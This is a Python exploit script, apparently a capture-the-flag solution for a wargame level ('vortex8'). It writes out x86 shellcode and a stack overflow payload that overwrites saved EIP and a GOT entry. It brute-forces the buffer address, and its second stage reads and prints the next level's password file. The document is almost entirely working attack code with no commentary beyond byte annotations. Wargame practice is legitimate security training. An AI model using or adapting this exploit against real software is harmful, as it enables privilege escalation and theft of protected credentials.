import os, time, select, sys, re

SC2UID = bytes.fromhex(
    "31c0b018cd805031c0b031cd805031c0b00431dbb30189e131d2b208cd80ebfe")
SC2PW = bytes.fromhex(
    "31c050"                    # push 0 (NUL dword)
    "6874657839"                # push 'tex9'
    "682f766f72"                # push '/vor'
    "6870617373"                # push 'pass'
    "687465785f"                # push 'tex_'
    "682f766f72"                # push '/vor'
    "682f657463"                # push '/etc'
    "89e331c9b005cd80"          # open("/etc/vortex_pass/vortex9", 0)
    "89c3b00389e131d2b264cd80"  # read(fd, esp, 100)
    "89c2b004b30189e1cd80"      # write(1, esp, n)
    "ebfe"                      # park
)

def build(buf, sc2, out):
    TOTAL = 1100
    OFF = 1036
    sc1 = (bytes.fromhex("b8") + (buf + 48).to_bytes(4, "little")
           + bytes.fromhex("a30cc00408")   # mov [sleep@GOT], eax
           + bytes.fromhex("68e3910408")   # push 0x80491e3 (safecode loop)
           + bytes.fromhex("c3"))          # ret
    sc1_addr = buf + 8
    p = bytearray(b"A" * TOTAL)
    p[8:8+len(sc1)] = sc1
    p[48:48+len(sc2)] = sc2
    p[OFF-4:OFF] = (0x0804a008).to_bytes(4, "little")  # saved ebp: readable
    p[OFF:OFF+4] = sc1_addr.to_bytes(4, "little")      # saved eip -> sc1
    if b"\x00" in p:
        raise ValueError("NUL")
    open(out, "wb").write(bytes(p))

def trial(buf, sc2, wait):
    build(buf, sc2, "pay_f.bin")
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.dup2(w, 1)
        os.execv(os.getcwd() + "/drv8", ["drv8", "pay_f.bin"])
    os.close(w)
    out = b""
    end = time.time() + wait
    while time.time() < end:
        rr, _, _ = select.select([r], [], [], 0.05)
        if rr:
            d = os.read(r, 4096)
            if not d:
                break
            out += d
            if len(out) > 20:
                break
    st = os.waitpid(pid, os.WNOHANG)
    alive = st[0] == 0
    if alive:
        os.kill(pid, 9)
        st = os.waitpid(pid, 0)
    os.close(r)
    return out, st[1]

lo, hi = int(sys.argv[1], 16), int(sys.argv[2], 16)
hit = None
for cand in range(lo, hi, 8):
    try:
        out, st = trial(cand, SC2UID, 1.8)
    except ValueError:
        continue
    print(hex(cand), st & 0x7f, flush=True)
    if b"\x91\x13" in out:
        hit = cand
        print("UID-HIT:", out[:24].hex(), flush=True)
        break
if hit is None:
    print("NO HIT", flush=True)
    sys.exit(1)
out, st = trial(hit, SC2PW, 3.2)
print("PW:", out.decode('latin-1').replace("\n", " "), flush=True)
